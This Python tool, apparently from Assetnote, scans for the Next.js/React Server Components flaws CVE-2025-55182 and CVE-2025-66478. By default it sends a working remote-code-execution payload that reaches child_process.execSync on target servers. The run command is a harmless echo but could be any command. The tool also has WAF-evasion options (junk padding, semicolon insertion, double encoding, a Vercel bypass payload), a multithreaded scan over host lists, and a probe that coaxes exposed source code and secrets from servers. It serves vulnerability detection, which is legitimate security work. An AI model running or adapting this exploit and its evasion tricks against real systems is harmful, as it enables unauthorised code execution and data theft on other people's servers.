#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = [
#     "requests>=2.28.0",
#     "tqdm>=4.64.0",
# ]
# ///
"""
React2Shell Scanner - High Fidelity Detection for RSC/Next.js RCE
CVE-2025-55182 & CVE-2025-66478

Based on research from Assetnote Security Research Team.
"""

import argparse
import sys
import json
import os
import random
import re
import string
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from typing import Optional, Tuple

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("Error: 'requests' library required. Install with: pip install requests")
    sys.exit(1)

try:
    from tqdm import tqdm
except ImportError:
    print("Error: 'tqdm' library required. Install with: pip install tqdm")
    sys.exit(1)


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def colorize(text: str, color: str) -> str:
    """Apply color to text."""
    return f"{color}{text}{Colors.RESET}"


def print_banner():
    """Print the tool banner."""
    banner = f"""
{Colors.CYAN}{Colors.BOLD}brought to you by assetnote{Colors.RESET}
"""
    print(banner)


def parse_headers(header_list: Optional[list[str]]) -> dict[str, str]:
    """Parse a list of 'Key: Value' strings into a dict."""
    headers = {}
    if not header_list:
        return headers
    for header in header_list:
        if ": " in header:
            key, value = header.split(": ", 1)
            headers[key] = value
        elif ":" in header:
            key, value = header.split(":", 1)
            headers[key] = value.lstrip()
    return headers


def normalize_host(host: str) -> str:
    """Normalize host to include scheme if missing."""
    host = host.strip()
    if not host:
        return ""
    if not host.startswith(("http://", "https://")):
        host = f"https://{host}"
    return host.rstrip("/")


def generate_junk_data(size_bytes: int) -> tuple[str, str]:
    """Generate random junk data for WAF bypass."""
    param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_bytes))
    return param_name, junk


def build_safe_payload() -> tuple[str, str]:
    """Build the safe multipart form data payload for the vulnerability check (side-channel)."""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f"{{}}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f'["$1:aa:aa"]\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )

    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def build_vercel_waf_bypass_payload() -> tuple[str, str]:
    """Build the Vercel WAF bypass multipart form data payload."""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
        '"var res=process.mainModule.require(\'child_process\').execSync(\'echo $((41*271))\').toString().trim();;'
        'throw Object.assign(new Error(\'NEXT_REDIRECT\'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",'
        '"_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}'
    )

    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="3"\r\n\r\n'
        f'{{"\\"\u0024\u0024":{{}}}}\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )

    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def build_rce_payload(windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128) -> tuple[str, str]:
    """Build the RCE PoC multipart form data payload."""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    if windows:
        # PowerShell payload - escape double quotes for JSON
        cmd = 'powershell -c \\\"41*271\\\"'
    else:
        # Linux/Unix payload
        cmd = 'echo $((41*271))'

    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    parts = []

    # Add junk data at the start if WAF bypass is enabled
    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb * 1024)
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
            f"{junk}\r\n"
        )

    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
    )
    parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")

    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def resolve_redirects(url: str, timeout: int, verify_ssl: bool, max_redirects: int = 10) -> str:
    """Follow redirects only if they stay on the same host."""
    current_url = url
    original_host = urlparse(url).netloc

    for _ in range(max_redirects):
        try:
            response = requests.head(
                current_url,
                timeout=timeout,
                verify=verify_ssl,
                allow_redirects=False
            )
            if response.status_code in (301, 302, 303, 307, 308):
                location = response.headers.get("Location")
                if location:
                    if location.startswith("/"):
                        # Relative redirect - same host, safe to follow
                        parsed = urlparse(current_url)
                        current_url = f"{parsed.scheme}://{parsed.netloc}{location}"
                    else:
                        # Absolute redirect - check if same host
                        new_host = urlparse(location).netloc
                        if new_host == original_host:
                            current_url = location
                        else:
                            break  # Different host, stop following
                else:
                    break
            else:
                break
        except RequestException:
            break
    return current_url


def url_encode_double(text: str) -> str:
    """Double URL encode a string."""
    from urllib.parse import quote
    return quote(quote(text, safe=''), safe='')


def add_semicolon_bypass(text: str) -> str:
    """Add semicolons in strategic places for WAF bypass."""
    # Add semicolons before common WAF-triggering patterns
    # This helps bypass some WAFs that parse on semicolons
    text = text.replace('execSync', ';execSync')
    text = text.replace('child_process', 'child_process;')
    text = text.replace('require(', 'require;(')
    text = text.replace('process.', 'process;.')
    return text


def send_payload(target_url: str, headers: dict, body: str, timeout: int, verify_ssl: bool, double_encode: bool = False, semicolon_bypass: bool = False) -> Tuple[Optional[requests.Response], Optional[str]]:
    """
    Send the exploit payload to a URL. Returns (response, error).
    
    Args:
        double_encode: Apply double URL encoding to the body
        semicolon_bypass: Add semicolons for WAF bypass
    """
    try:
        # Apply WAF bypass techniques if requested
        modified_body = body
        
        if semicolon_bypass:
            modified_body = add_semicolon_bypass(modified_body)
        
        if double_encode:
            # Double encode the body
            modified_body = url_encode_double(modified_body)
        
        # Encode body as bytes to ensure proper Content-Length calculation
        # and avoid potential encoding issues with the HTTP client
        body_bytes = modified_body.encode('utf-8') if isinstance(modified_body, str) else modified_body
        response = requests.post(
            target_url,
            headers=headers,
            data=body_bytes,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=False
        )
        return response, None
    except requests.exceptions.SSLError as e:
        return None, f"SSL Error: {str(e)}"
    except requests.exceptions.ConnectionError as e:
        return None, f"Connection Error: {str(e)}"
    except requests.exceptions.Timeout:
        return None, "Request timed out"
    except RequestException as e:
        return None, f"Request failed: {str(e)}"
    except Exception as e:
        return None, f"Unexpected error: {str(e)}"


def is_vulnerable_safe_check(response: requests.Response) -> bool:
    """Check if a response indicates vulnerability (safe side-channel check)."""
    if response.status_code != 500 or 'E{"digest"' not in response.text:
        return False

    # Check for Vercel/Netlify mitigations (not valid findings)
    server_header = response.headers.get("Server", "").lower()
    has_netlify_vary = "Netlify-Vary" in response.headers
    is_mitigated = (
        has_netlify_vary
        or server_header == "netlify"
        or server_header == "vercel"
    )

    return not is_mitigated


def is_vulnerable_rce_check(response: requests.Response) -> bool:
    """Check if a response indicates vulnerability (RCE PoC check)."""
    # Check for the X-Action-Redirect header with the expected value
    redirect_header = response.headers.get("X-Action-Redirect", "")
    return bool(re.search(r'.*/login\?a=11111.*', redirect_header))


def extract_action_ids(html_content: str) -> list[str]:
    """Extract ACTION_ID values from HTML content."""
    action_ids = []
    # Pattern: ACTION_ID_ followed by alphanumeric hash (typically 40-50 chars)
    # Can appear in hidden inputs, data attributes, or inline scripts
    patterns = [
        r'ACTION_ID_([a-f0-9]{40,50})',  # Standard format: ACTION_ID_<hash>
        r'["\']?\$?ACTION_ID_([a-f0-9]{40,50})["\']?',  # With quotes or $ prefix
        r'value=["\']?\$?ACTION_ID_([a-f0-9]{40,50})["\']?',  # In value attribute
        r'data-action-id=["\']([a-f0-9]{40,50})["\']',  # In data-action-id attribute
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, html_content, re.IGNORECASE)
        action_ids.extend(matches)
    
    # Remove duplicates while preserving order
    seen = set()
    unique_ids = []
    for action_id in action_ids:
        if action_id not in seen:
            seen.add(action_id)
            unique_ids.append(action_id)
    
    return unique_ids


def is_source_code_exposed(response: requests.Response) -> bool:
    """Check if response contains exposed source code."""
    if response.status_code != 200:
        return False
    
    response_text = response.text
    
    # Indicators of exposed source code:
    # 1. Function definitions in response
    # 2. Secret keys or API keys
    # 3. Database queries
    # 4. Development mode indicators
    # 5. Source code comments
    
    indicators = [
        # Function definitions
        r'async\s+function\s+\w+',
        r'function\s+\w+\s*\([^)]*\)\s*\{',
        r'const\s+\w+\s*=\s*(async\s+)?\([^)]*\)\s*=>',
        # Secrets and keys
        r'(secret|api[_-]?key|private[_-]?key|access[_-]?token)\s*[:=]\s*["\'][^"\']+["\']',
        r'INTERNAL[_-]?SECRET',
        r'SECRET[_-]?KEY',
        # Database queries
        r'INSERT\s+INTO\s+\w+',
        r'SELECT\s+.*\s+FROM\s+\w+',
        r'UPDATE\s+\w+\s+SET',
        # Development mode
        r'"b"\s*:\s*"development"',
        r'"development"',
        # Source code comments
        r'//\s*VULNERABLE',
        r'/\*\s*VULNERABLE',
        # Exposed code structure
        r'inserted["\']?\s*:\s*["\']?.*function',
        r'inserted["\']?\s*:\s*["\']?.*async',
    ]
    
    for pattern in indicators:
        if re.search(pattern, response_text, re.IGNORECASE | re.MULTILINE):
            return True
    
    return False


def check_action_id_exposure(host: str, timeout: int = 10, verify_ssl: bool = True, custom_headers: Optional[dict[str, str]] = None) -> dict:
    """
    Check for source code exposure via ACTION_ID extraction and testing.
    
    Returns a dict with:
        - host: the target host
        - vulnerable: True/False/None (None if error)
        - status_code: HTTP status code
        - error: error message if any
        - action_ids_found: list of ACTION_IDs found
        - exposed_code: True if source code was exposed
    """
    result = {
        "host": host,
        "vulnerable": None,
        "status_code": None,
        "error": None,
        "action_ids_found": [],
        "exposed_code": False,
        "tested_url": None,
        "final_url": None,
        "timestamp": datetime.now(timezone.utc).isoformat() + "Z"
    }
    
    host = normalize_host(host)
    if not host:
        result["error"] = "Invalid or empty host"
        return result
    
    # Step 1: Fetch HTML to find ACTION_IDs
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }
        
        if custom_headers:
            headers.update(custom_headers)
        
        response = requests.get(
            host,
            headers=headers,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=True
        )
        
        result["status_code"] = response.status_code
        result["tested_url"] = host
        result["final_url"] = response.url
        
        if response.status_code != 200:
            result["vulnerable"] = False
            result["error"] = f"Failed to fetch HTML: HTTP {response.status_code}"
            return result
        
        # Step 2: Extract ACTION_IDs from HTML
        action_ids = extract_action_ids(response.text)
        result["action_ids_found"] = action_ids
        
        if not action_ids:
            result["vulnerable"] = False
            return result
        
        # Step 3: Test each ACTION_ID for source code exposure
        for action_id in action_ids:
            # Build payload with the ACTION_ID
            # Format based on research: fearsoff=<padding>["$F1"]&1={"id":"<action_id>","bound":null}
            # Generate some padding to potentially bypass WAFs
            padding = "_AAAAA_REPEATED_" * 100  # Small padding, can be increased if needed
            payload_json = json.dumps({"id": action_id, "bound": None})
            body = f'fearsoff={padding}["$F1"]&1={payload_json}'
            
            # Headers for the POST request
            post_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
                "Next-Action": action_id,
                "X-Nextjs-Request-Id": "b5dce965",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/x-component",
                "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
            }
            
            if custom_headers:
                post_headers.update(custom_headers)
            
            try:
                post_response = requests.post(
                    host,
                    headers=post_headers,
                    data=body,
                    timeout=timeout,
                    verify=verify_ssl,
                    allow_redirects=False
                )
                
                # Check if source code is exposed
                if is_source_code_exposed(post_response):
                    result["vulnerable"] = True
                    result["exposed_code"] = True
                    result["status_code"] = post_response.status_code
                    # Store response for verbose output
                    result["response"] = f"HTTP/1.1 {post_response.status_code} {post_response.reason}\r\n"
                    for k, v in post_response.headers.items():
                        result["response"] += f"{k}: {v}\r\n"
                    result["response"] += f"\r\n{post_response.text[:2000]}"
                    return result
                    
            except requests.exceptions.RequestException:
                continue  # Try next ACTION_ID
        
        # No source code exposure found
        result["vulnerable"] = False
        return result
        
    except requests.exceptions.Timeout:
        result["error"] = "Request timed out"
        return result
    except requests.exceptions.RequestException as e:
        result["error"] = f"Request failed: {str(e)}"
        return result
    except Exception as e:
        result["error"] = f"Unexpected error: {str(e)}"
        return result


def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, follow_redirects: bool = True, custom_headers: Optional[dict[str, str]] = None, safe_check: bool = False, windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, vercel_waf_bypass: bool = False, paths: Optional[list[str]] = None, double_encode: bool = False, semicolon_bypass: bool = False) -> dict:
    """
    Check if a host is vulnerable to CVE-2025-55182/CVE-2025-66478.

    Tests root path first. If not vulnerable and redirects exist, tests redirect path.

    Returns a dict with:
        - host: the target host
        - vulnerable: True/False/None (None if error)
        - status_code: HTTP status code
        - error: error message if any
        - request: the raw request sent
        - response: the raw response received
    """
    result = {
        "host": host,
        "vulnerable": None,
        "status_code": None,
        "error": None,
        "request": None,
        "response": None,
        "final_url": None,
        "tested_url": None,
        "timestamp": datetime.now(timezone.utc).isoformat() + "Z"
    }

    host = normalize_host(host)
    if not host:
        result["error"] = "Invalid or empty host"
        return result

    # Determine which paths to test
    if paths:
        test_paths = paths
    else:
        test_paths = ["/"]  # Default to root path

    if safe_check:
        body, content_type = build_safe_payload()
        is_vulnerable = is_vulnerable_safe_check
    elif vercel_waf_bypass:
        body, content_type = build_vercel_waf_bypass_payload()
        is_vulnerable = is_vulnerable_rce_check
    else:
        body, content_type = build_rce_payload(windows=windows, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb)
        is_vulnerable = is_vulnerable_rce_check

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
        "Next-Action": "x",
        "X-Nextjs-Request-Id": "b5dce965",
        "Content-Type": content_type,
        "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
    }

    # Apply custom headers (override defaults)
    if custom_headers:
        headers.update(custom_headers)

    def build_request_str(url: str) -> str:
        parsed = urlparse(url)
        req_str = f"POST {'/aaa' or '/aaa'} HTTP/1.1\r\n"
        req_str += f"Host: {parsed.netloc}\r\n"
        for k, v in headers.items():
            req_str += f"{k}: {v}\r\n"
        req_str += f"Content-Length: {len(body)}\r\n\r\n"
        req_str += body
        return req_str

    def build_response_str(resp: requests.Response) -> str:
        resp_str = f"HTTP/1.1 {resp.status_code} {resp.reason}\r\n"
        for k, v in resp.headers.items():
            resp_str += f"{k}: {v}\r\n"
        resp_str += f"\r\n{resp.text[:2000]}"
        return resp_str

    # Test each path
    for idx, path in enumerate(test_paths):
        # Ensure path starts with /
        if not path.startswith("/"):
            path = "/" + path
        
        test_url = f"{host}{path}"
        
        # First, test the path
        result["tested_url"] = test_url
        result["final_url"] = test_url
        result["request"] = build_request_str(test_url)

        response, error = send_payload(test_url, headers, body, timeout, verify_ssl, double_encode=double_encode, semicolon_bypass=semicolon_bypass)

        if error:
            # In RCE mode, timeouts indicate not vulnerable (patched servers hang)
            if not safe_check and error == "Request timed out":
                result["vulnerable"] = False
                result["error"] = error
                # Continue to next path if there are more, otherwise return
                if idx < len(test_paths) - 1:
                    continue
                return result
            # For other errors, continue to next path unless it's the last one
            if idx < len(test_paths) - 1:
                continue
            result["error"] = error
            return result

        result["status_code"] = response.status_code
        result["response"] = build_response_str(response)

        if is_vulnerable(response):
            result["vulnerable"] = True
            return result

        # Path not vulnerable - try redirect path if enabled
        if follow_redirects:
            try:
                redirect_url = resolve_redirects(test_url, timeout, verify_ssl)
                if redirect_url != test_url:
                    # Different path, test it
                    response, error = send_payload(redirect_url, headers, body, timeout, verify_ssl, double_encode=double_encode, semicolon_bypass=semicolon_bypass)

                    if error:
                        # Continue to next path
                        continue

                    result["final_url"] = redirect_url
                    result["request"] = build_request_str(redirect_url)
                    result["status_code"] = response.status_code
                    result["response"] = build_response_str(response)

                    if is_vulnerable(response):
                        result["vulnerable"] = True
                        return result
            except Exception:
                pass  # Continue to next path if redirect resolution fails

    # All paths tested, not vulnerable
    result["vulnerable"] = False
    return result


def load_hosts(hosts_file: str) -> list[str]:
    """Load hosts from a file, one per line."""
    hosts = []
    try:
        with open(hosts_file, "r") as f:
            for line in f:
                host = line.strip()
                if host and not host.startswith("#"):
                    hosts.append(host)
    except FileNotFoundError:
        print(colorize(f"[ERROR] File not found: {hosts_file}", Colors.RED))
        sys.exit(1)
    except Exception as e:
        print(colorize(f"[ERROR] Failed to read file: {e}", Colors.RED))
        sys.exit(1)
    return hosts


def load_paths(paths_file: str) -> list[str]:
    """Load paths from a file, one per line."""
    paths = []
    try:
        with open(paths_file, "r") as f:
            for line in f:
                path = line.strip()
                if path and not path.startswith("#"):
                    # Ensure path starts with /
                    if not path.startswith("/"):
                        path = "/" + path
                    paths.append(path)
    except FileNotFoundError:
        print(colorize(f"[ERROR] File not found: {paths_file}", Colors.RED))
        sys.exit(1)
    except Exception as e:
        print(colorize(f"[ERROR] Failed to read file: {e}", Colors.RED))
        sys.exit(1)
    return paths


def save_results(results: list[dict], output_file: str, vulnerable_only: bool = True):
    if vulnerable_only:
        results = [r for r in results if r.get("vulnerable") is True]

    output = {
        "scan_time": datetime.now(timezone.utc).isoformat() + "Z",
        "total_results": len(results),
        "results": results
    }

    try:
        with open(output_file, "w") as f:
            json.dump(output, f, indent=2)
        print(colorize(f"\n[+] Results saved to: {output_file}", Colors.GREEN))
    except Exception as e:
        print(colorize(f"\n[ERROR] Failed to save results: {e}", Colors.RED))


def print_result(result: dict, verbose: bool = False):
    host = result["host"]
    final_url = result.get("final_url")
    tested_url = result.get("tested_url")
    # A redirect occurred if final_url differs from the originally tested URL
    redirected = final_url and tested_url and final_url != tested_url

    if result["vulnerable"] is True:
        status = colorize("[VULNERABLE]", Colors.RED + Colors.BOLD)
        print(f"{status} {colorize(host, Colors.WHITE)} - Status: {result['status_code']}")
        if redirected:
            print(f"  -> Redirected to: {final_url}")
        
        # Show ACTION_ID findings if available
        action_ids = result.get("action_ids_found", [])
        if action_ids:
            print(colorize(f"  -> Found {len(action_ids)} ACTION_ID(s): {', '.join(action_ids[:3])}", Colors.YELLOW))
            if len(action_ids) > 3:
                print(colorize(f"  -> ... and {len(action_ids) - 3} more", Colors.YELLOW))
        
        if result.get("exposed_code"):
            print(colorize("  -> Source code exposed in response!", Colors.RED + Colors.BOLD))
    elif result["vulnerable"] is False:
        status = colorize("[NOT VULNERABLE]", Colors.GREEN)
        if result.get('status_code') is not None:
            print(f"{status} {host} - Status: {result['status_code']}")
        else:
            error_msg = result.get("error", "")
            print(f"{status} {host}" + (f" - {error_msg}" if error_msg else ""))
        if redirected and verbose:
            print(f"  -> Redirected to: {final_url}")
        
        # Show ACTION_ID findings even if not vulnerable
        action_ids = result.get("action_ids_found", [])
        if action_ids and verbose:
            print(colorize(f"  -> Found {len(action_ids)} ACTION_ID(s) but no source code exposure", Colors.CYAN))
    else:
        status = colorize("[ERROR]", Colors.YELLOW)
        error_msg = result.get("error", "Unknown error")
        print(f"{status} {host} - {error_msg}")

    if verbose and result.get("response"):
        print(colorize("  Response snippet:", Colors.CYAN))
        lines = result["response"].split("\r\n")[:10]
        for line in lines:
            print(f"    {line}")


def main():
    parser = argparse.ArgumentParser(
        description="React2Shell Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u https://example.com
  %(prog)s -l hosts.txt -t 20 -o results.json
  %(prog)s -l hosts.txt --threads 50 --timeout 15
  %(prog)s -u https://example.com -H "Authorization: Bearer token" -H "User-Agent: CustomAgent"
  %(prog)s -u https://example.com --path /_next
  %(prog)s -u https://example.com --path /_next --path /api
  %(prog)s -u https://example.com --path-file paths.txt
  %(prog)s -u https://example.com --check-source-exposure
        """
    )

    input_group = parser.add_mutually_exclusive_group(required=True)
    input_group.add_argument(
        "-u", "--url",
        help="Single URL/host to check"
    )
    input_group.add_argument(
        "-l", "--list",
        help="File containing list of hosts (one per line)"
    )

    parser.add_argument(
        "-t", "--threads",
        type=int,
        default=10,
        help="Number of concurrent threads (default: 10)"
    )

    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )

    parser.add_argument(
        "-o", "--output",
        help="Output file for results (JSON format)"
    )

    parser.add_argument(
        "--all-results",
        action="store_true",
        help="Save all results to output file, not just vulnerable hosts"
    )

    parser.add_argument(
        "-k", "--insecure",
        default=True,
        action="store_true",
        help="Disable SSL certificate verification"
    )

    parser.add_argument(
        "-H", "--header",
        action="append",
        dest="headers",
        metavar="HEADER",
        help="Custom header in 'Key: Value' format (can be used multiple times)"
    )

    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Verbose output (show response snippets for all hosts)"
    )

    parser.add_argument(
        "-q", "--quiet",
        action="store_true",
        help="Quiet mode (only show vulnerable hosts)"
    )

    parser.add_argument(
        "--no-color",
        action="store_true",
        help="Disable colored output"
    )

    parser.add_argument(
        "--safe-check",
        action="store_true",
        help="Use safe side-channel detection instead of RCE PoC"
    )

    parser.add_argument(
        "--windows",
        action="store_true",
        help="Use Windows PowerShell payload instead of Unix shell"
    )

    parser.add_argument(
        "--waf-bypass",
        action="store_true",
        help="Add junk data to bypass WAF content inspection (default: 128KB)"
    )

    parser.add_argument(
        "--waf-bypass-size",
        type=int,
        default=128,
        metavar="KB",
        help="Size of junk data in KB for WAF bypass (default: 128)"
    )

    parser.add_argument(
        "--vercel-waf-bypass",
        action="store_true",
        help="Use Vercel WAF bypass payload variant"
    )

    parser.add_argument(
        "--path",
        action="append",
        dest="paths",
        help="Custom path to test (e.g., '/_next', '/api'). Can be used multiple times to test multiple paths"
    )

    parser.add_argument(
        "--path-file",
        help="File containing list of paths to test (one per line, e.g., '/_next', '/api')"
    )

    parser.add_argument(
        "--check-source-exposure",
        action="store_true",
        help="Check for source code exposure via ACTION_ID extraction from HTML"
    )

    parser.add_argument(
        "--double-encode",
        action="store_true",
        help="Apply double URL encoding to bypass WAFs"
    )

    parser.add_argument(
        "--semicolon-bypass",
        action="store_true",
        help="Add semicolons in strategic places to bypass WAFs"
    )

    args = parser.parse_args()

    if args.no_color or not sys.stdout.isatty():
        Colors.RED = ""
        Colors.GREEN = ""
        Colors.YELLOW = ""
        Colors.BLUE = ""
        Colors.MAGENTA = ""
        Colors.CYAN = ""
        Colors.WHITE = ""
        Colors.BOLD = ""
        Colors.RESET = ""

    if not args.quiet:
        print_banner()

    if args.url:
        hosts = [args.url]
    else:
        hosts = load_hosts(args.list)

    if not hosts:
        print(colorize("[ERROR] No hosts to scan", Colors.RED))
        sys.exit(1)

    # Load paths if specified
    paths = None
    if args.path_file:
        paths = load_paths(args.path_file)
    elif args.paths:
        paths = []
        for path in args.paths:
            # Ensure path starts with /
            if not path.startswith("/"):
                path = "/" + path
            paths.append(path)

    # Adjust timeout for WAF bypass mode
    timeout = args.timeout
    if args.waf_bypass and args.timeout == 10:
        timeout = 20

    if not args.quiet:
        print(colorize(f"[*] Loaded {len(hosts)} host(s) to scan", Colors.CYAN))
        if paths:
            print(colorize(f"[*] Testing {len(paths)} path(s): {', '.join(paths)}", Colors.CYAN))
        print(colorize(f"[*] Using {args.threads} thread(s)", Colors.CYAN))
        print(colorize(f"[*] Timeout: {timeout}s", Colors.CYAN))
        if args.safe_check:
            print(colorize("[*] Using safe side-channel check", Colors.CYAN))
        else:
            print(colorize("[*] Using RCE PoC check", Colors.CYAN))
        if args.windows:
            print(colorize("[*] Windows mode enabled (PowerShell payload)", Colors.CYAN))
        if args.waf_bypass:
            print(colorize(f"[*] WAF bypass enabled ({args.waf_bypass_size}KB junk data)", Colors.CYAN))
        if args.vercel_waf_bypass:
            print(colorize("[*] Vercel WAF bypass mode enabled", Colors.CYAN))
        if args.double_encode:
            print(colorize("[*] Double URL encoding bypass enabled", Colors.CYAN))
        if args.semicolon_bypass:
            print(colorize("[*] Semicolon bypass enabled", Colors.CYAN))
        if args.check_source_exposure:
            print(colorize("[*] Source code exposure check enabled (ACTION_ID extraction)", Colors.CYAN))
        if args.insecure:
            print(colorize("[!] SSL verification disabled", Colors.YELLOW))
        print()

    results = []
    vulnerable_count = 0
    error_count = 0

    verify_ssl = not args.insecure
    custom_headers = parse_headers(args.headers)

    if args.insecure:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # Determine which check function to use
    if args.check_source_exposure:
        check_func = check_action_id_exposure
        check_kwargs = {"timeout": timeout, "verify_ssl": verify_ssl, "custom_headers": custom_headers}
    else:
        check_func = check_vulnerability
        check_kwargs = {
            "timeout": timeout,
            "verify_ssl": verify_ssl,
            "custom_headers": custom_headers,
            "safe_check": args.safe_check,
            "windows": args.windows,
            "waf_bypass": args.waf_bypass,
            "waf_bypass_size_kb": args.waf_bypass_size,
            "vercel_waf_bypass": args.vercel_waf_bypass,
            "paths": paths,
            "double_encode": args.double_encode,
            "semicolon_bypass": args.semicolon_bypass
        }
    
    if len(hosts) == 1:
        result = check_func(hosts[0], **check_kwargs)
        results.append(result)
        if not args.quiet or result["vulnerable"]:
            print_result(result, args.verbose)
        if result["vulnerable"]:
            vulnerable_count = 1
    else:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {
                executor.submit(check_func, host, **check_kwargs): host
                for host in hosts
            }

            with tqdm(
                total=len(hosts),
                desc=colorize("Scanning", Colors.CYAN),
                unit="host",
                ncols=80,
                disable=args.quiet
            ) as pbar:
                for future in as_completed(futures):
                    result = future.result()
                    results.append(result)

                    if result["vulnerable"]:
                        vulnerable_count += 1
                        tqdm.write("")
                        print_result(result, args.verbose)
                    elif result["error"]:
                        error_count += 1
                        if not args.quiet and args.verbose:
                            tqdm.write("")
                            print_result(result, args.verbose)
                    elif not args.quiet and args.verbose:
                        tqdm.write("")
                        print_result(result, args.verbose)

                    pbar.update(1)

    if not args.quiet:
        print()
        print(colorize("=" * 60, Colors.CYAN))
        print(colorize("SCAN SUMMARY", Colors.BOLD))
        print(colorize("=" * 60, Colors.CYAN))
        print(f"  Total hosts scanned: {len(hosts)}")

        if vulnerable_count > 0:
            print(f"  {colorize(f'Vulnerable: {vulnerable_count}', Colors.RED + Colors.BOLD)}")
        else:
            print(f"  Vulnerable: {vulnerable_count}")

        print(f"  Not vulnerable: {len(hosts) - vulnerable_count - error_count}")
        print(f"  Errors: {error_count}")
        print(colorize("=" * 60, Colors.CYAN))

    if args.output:
        save_results(results, args.output, vulnerable_only=not args.all_results)

    if vulnerable_count > 0:
        sys.exit(1)
    sys.exit(0)


if __name__ == "__main__":
    main()